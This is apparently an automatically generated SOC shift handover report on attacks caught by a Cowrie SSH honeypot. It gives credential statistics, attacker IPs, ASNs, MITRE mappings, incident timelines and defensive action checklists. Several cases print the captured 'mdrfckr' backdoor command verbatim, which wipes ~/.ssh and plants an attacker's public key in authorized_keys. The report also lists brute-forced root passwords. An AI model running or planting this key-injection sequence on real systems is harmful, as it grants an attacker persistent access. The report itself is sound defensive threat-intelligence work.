# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-22 |
| **Generated At** | 2026-03-22T22:23:55Z |
| **Shift Time** | 22:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **104** |
| Confirmed Threats | **76** |
| False Positives Filtered | **28** (26.9%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **16** |
| High Severity Cases | **15** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **89** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **45** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **23** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 15 |
| `345gs5662d34` | 5 |
| `support` | 2 |
| `Guest` | 2 |
| `sipv` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `123` | 3 |
| `bond007` | 2 |
| `Vision` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `bond007` | 2 |
| `root` | `Vision` | 2 |
| `Guest` | `Guest1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `bond007` | `109.199.114.34` | 2026-03-22T20:30:26 |
| `root` | `bond007` | `220.169.100.15` | 2026-03-22T20:30:35 |
| `root` | `Vision` | `118.26.153.102` | 2026-03-22T21:09:50 |
| `root` | `Vision` | `112.25.140.211` | 2026-03-22T21:10:00 |
| `root` | `Zz112233` | `180.93.172.213` | 2026-03-22T21:33:15 |
| `root` | `3245gs5662d34` | `180.93.172.213` | 2026-03-22T21:33:19 |
| `root` | `qwe123456` | `197.211.55.20` | 2026-03-22T21:35:55 |
| `root` | `3245gs5662d34` | `197.211.55.20` | 2026-03-22T21:36:02 |
| `root` | `Admin2026!` | `180.93.172.213` | 2026-03-22T21:37:37 |
| `root` | `jancok123` | `197.211.55.20` | 2026-03-22T21:44:12 |
| `root` | `testtest` | `123.58.209.118` | 2026-03-22T21:45:13 |
| `root` | `Toyou@123` | `197.211.55.20` | 2026-03-22T21:50:29 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.211.55.20`, `180.93.172.213`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **24** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS15311` | TELEFONICA EMPRESAS CHILE SA | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS55330` | AFGHANTELECOM GOVERNMENT COMMUNICATION NETWORK | 1 | HIGH |
| `AS20686` | Bisping & Bisping GmbH & Co KG | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (15)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f67b88a0899c

| Field | Detail |
|---|---|
| **Source IP** | `109.199.114[.]34` |
| **First Seen** | 2026-03-22 20:30 |
| **Last Seen** | 2026-03-22 20:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 20:30:24` | `cowrie.session.connect` |
| `2026-03-22 20:30:25` | `cowrie.client.version` |
| `2026-03-22 20:30:25` | `cowrie.client.kex` |
| `2026-03-22 20:30:26` | `cowrie.login.success` |
| `2026-03-22 20:30:26` | `cowrie.direct-tcpip.request` |
| `2026-03-22 20:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.199.114[.]34` to AbuseIPDB if not already reported
- [ ] Block `109.199.114[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c23d32c38d

| Field | Detail |
|---|---|
| **Source IP** | `220.169.100[.]15` |
| **First Seen** | 2026-03-22 20:30 |
| **Last Seen** | 2026-03-22 20:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 20:30:32` | `cowrie.session.connect` |
| `2026-03-22 20:30:33` | `cowrie.client.version` |
| `2026-03-22 20:30:33` | `cowrie.client.kex` |
| `2026-03-22 20:30:35` | `cowrie.login.success` |
| `2026-03-22 20:30:35` | `cowrie.direct-tcpip.request` |
| `2026-03-22 20:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.169.100[.]15` to AbuseIPDB if not already reported
- [ ] Block `220.169.100[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452cdb9023b8

| Field | Detail |
|---|---|
| **Source IP** | `118.26.153[.]102` |
| **First Seen** | 2026-03-22 21:09 |
| **Last Seen** | 2026-03-22 21:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:09:48` | `cowrie.session.connect` |
| `2026-03-22 21:09:48` | `cowrie.client.version` |
| `2026-03-22 21:09:48` | `cowrie.client.kex` |
| `2026-03-22 21:09:50` | `cowrie.login.success` |
| `2026-03-22 21:09:50` | `cowrie.direct-tcpip.request` |
| `2026-03-22 21:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.153[.]102` to AbuseIPDB if not already reported
- [ ] Block `118.26.153[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdd1fcdccb90

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-03-22 21:09 |
| **Last Seen** | 2026-03-22 21:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:09:56` | `cowrie.session.connect` |
| `2026-03-22 21:09:57` | `cowrie.client.version` |
| `2026-03-22 21:09:57` | `cowrie.client.kex` |
| `2026-03-22 21:10:00` | `cowrie.login.success` |
| `2026-03-22 21:10:01` | `cowrie.direct-tcpip.request` |
| `2026-03-22 21:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192c19738cd9

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-03-22 21:33 |
| **Last Seen** | 2026-03-22 21:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:33:14` | `cowrie.session.connect` |
| `2026-03-22 21:33:14` | `cowrie.client.version` |
| `2026-03-22 21:33:15` | `cowrie.client.kex` |
| `2026-03-22 21:33:15` | `cowrie.login.success` |
| `2026-03-22 21:33:15` | `cowrie.session.params` |
| `2026-03-22 21:33:15` | `cowrie.command.input` |
| `2026-03-22 21:33:15` | `cowrie.command.failed` |
| `2026-03-22 21:33:16` | `cowrie.log.closed` |
| `2026-03-22 21:33:16` | `cowrie.session.params` |
| `2026-03-22 21:33:16` | `cowrie.command.input` |
| `2026-03-22 21:33:16` | `cowrie.session.file_download` |
| `2026-03-22 21:33:16` | `cowrie.log.closed` |
| `2026-03-22 21:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dfbc29e5edc

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-03-22 21:33 |
| **Last Seen** | 2026-03-22 21:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:33:18` | `cowrie.session.connect` |
| `2026-03-22 21:33:18` | `cowrie.client.version` |
| `2026-03-22 21:33:19` | `cowrie.client.kex` |
| `2026-03-22 21:33:19` | `cowrie.login.success` |
| `2026-03-22 21:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69ccd099362c

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-22 21:35 |
| **Last Seen** | 2026-03-22 21:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:35:54` | `cowrie.session.connect` |
| `2026-03-22 21:35:54` | `cowrie.client.version` |
| `2026-03-22 21:35:54` | `cowrie.client.kex` |
| `2026-03-22 21:35:55` | `cowrie.login.success` |
| `2026-03-22 21:35:56` | `cowrie.session.params` |
| `2026-03-22 21:35:56` | `cowrie.command.input` |
| `2026-03-22 21:35:56` | `cowrie.command.failed` |
| `2026-03-22 21:35:56` | `cowrie.log.closed` |
| `2026-03-22 21:35:57` | `cowrie.session.params` |
| `2026-03-22 21:35:57` | `cowrie.command.input` |
| `2026-03-22 21:35:57` | `cowrie.session.file_download` |
| `2026-03-22 21:35:57` | `cowrie.log.closed` |
| `2026-03-22 21:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ddc0aea74d

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-22 21:36 |
| **Last Seen** | 2026-03-22 21:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:36:00` | `cowrie.session.connect` |
| `2026-03-22 21:36:00` | `cowrie.client.version` |
| `2026-03-22 21:36:01` | `cowrie.client.kex` |
| `2026-03-22 21:36:02` | `cowrie.login.success` |
| `2026-03-22 21:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-574cffd20362

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-03-22 21:37 |
| **Last Seen** | 2026-03-22 21:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:37:36` | `cowrie.session.connect` |
| `2026-03-22 21:37:36` | `cowrie.client.version` |
| `2026-03-22 21:37:36` | `cowrie.client.kex` |
| `2026-03-22 21:37:37` | `cowrie.login.success` |
| `2026-03-22 21:37:37` | `cowrie.session.params` |
| `2026-03-22 21:37:37` | `cowrie.command.input` |
| `2026-03-22 21:37:37` | `cowrie.command.failed` |
| `2026-03-22 21:37:37` | `cowrie.log.closed` |
| `2026-03-22 21:37:38` | `cowrie.session.params` |
| `2026-03-22 21:37:38` | `cowrie.command.input` |
| `2026-03-22 21:37:38` | `cowrie.session.file_download` |
| `2026-03-22 21:37:38` | `cowrie.log.closed` |
| `2026-03-22 21:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d6a3d14d2f

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-03-22 21:37 |
| **Last Seen** | 2026-03-22 21:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:37:40` | `cowrie.session.connect` |
| `2026-03-22 21:37:40` | `cowrie.client.version` |
| `2026-03-22 21:37:40` | `cowrie.client.kex` |
| `2026-03-22 21:37:41` | `cowrie.login.success` |
| `2026-03-22 21:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83eb0848f188

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-22 21:44 |
| **Last Seen** | 2026-03-22 21:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:44:11` | `cowrie.session.connect` |
| `2026-03-22 21:44:11` | `cowrie.client.version` |
| `2026-03-22 21:44:11` | `cowrie.client.kex` |
| `2026-03-22 21:44:12` | `cowrie.login.success` |
| `2026-03-22 21:44:13` | `cowrie.session.params` |
| `2026-03-22 21:44:13` | `cowrie.command.input` |
| `2026-03-22 21:44:13` | `cowrie.command.failed` |
| `2026-03-22 21:44:13` | `cowrie.log.closed` |
| `2026-03-22 21:44:14` | `cowrie.session.params` |
| `2026-03-22 21:44:14` | `cowrie.command.input` |
| `2026-03-22 21:44:14` | `cowrie.session.file_download` |
| `2026-03-22 21:44:14` | `cowrie.log.closed` |
| `2026-03-22 21:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f0b5584120

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-22 21:44 |
| **Last Seen** | 2026-03-22 21:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:44:17` | `cowrie.session.connect` |
| `2026-03-22 21:44:17` | `cowrie.client.version` |
| `2026-03-22 21:44:17` | `cowrie.client.kex` |
| `2026-03-22 21:44:19` | `cowrie.login.success` |
| `2026-03-22 21:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98cfd2476192

| Field | Detail |
|---|---|
| **Source IP** | `123.58.209[.]118` |
| **First Seen** | 2026-03-22 21:45 |
| **Last Seen** | 2026-03-22 21:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'dGVzdA==' | base64 -d 2>/dev/null` |
| **TTPs (MITRE)** | T1027 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:45:12` | `cowrie.session.connect` |
| `2026-03-22 21:45:12` | `cowrie.client.version` |
| `2026-03-22 21:45:12` | `cowrie.client.kex` |
| `2026-03-22 21:45:13` | `cowrie.login.success` |
| `2026-03-22 21:45:16` | `cowrie.session.params` |
| `2026-03-22 21:45:16` | `cowrie.command.input` |
| `2026-03-22 21:45:17` | `cowrie.log.closed` |
| `2026-03-22 21:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.58.209[.]118` to AbuseIPDB if not already reported
- [ ] Block `123.58.209[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b526780ba04d

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-22 21:50 |
| **Last Seen** | 2026-03-22 21:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:50:28` | `cowrie.session.connect` |
| `2026-03-22 21:50:28` | `cowrie.client.version` |
| `2026-03-22 21:50:28` | `cowrie.client.kex` |
| `2026-03-22 21:50:29` | `cowrie.login.success` |
| `2026-03-22 21:50:30` | `cowrie.session.params` |
| `2026-03-22 21:50:30` | `cowrie.command.input` |
| `2026-03-22 21:50:30` | `cowrie.command.failed` |
| `2026-03-22 21:50:30` | `cowrie.log.closed` |
| `2026-03-22 21:50:31` | `cowrie.session.params` |
| `2026-03-22 21:50:31` | `cowrie.command.input` |
| `2026-03-22 21:50:31` | `cowrie.session.file_download` |
| `2026-03-22 21:50:31` | `cowrie.log.closed` |
| `2026-03-22 21:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48145c744ed2

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-22 21:50 |
| **Last Seen** | 2026-03-22 21:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 21:50:34` | `cowrie.session.connect` |
| `2026-03-22 21:50:34` | `cowrie.client.version` |
| `2026-03-22 21:50:34` | `cowrie.client.kex` |
| `2026-03-22 21:50:35` | `cowrie.login.success` |
| `2026-03-22 21:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `66.167.166[.]125` | **25** | 2026-03-22 20:36 | 2026-03-22 20:41 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `180.93.172[.]213` | **10** | 2026-03-22 21:26 | 2026-03-22 21:50 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.211.55[.]20` | **10** | 2026-03-22 21:28 | 2026-03-22 21:50 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `50.35.168[.]148` | **3** | 2026-03-22 21:26 | 2026-03-22 21:42 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `101.13.5[.]26` | 1 | 2026-03-22 21:39 | 2026-03-22 21:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.108.13[.]168` | 1 | 2026-03-22 20:42 | 2026-03-22 20:43 | 30s | 0 | `T1592` | 🟢 LOW |
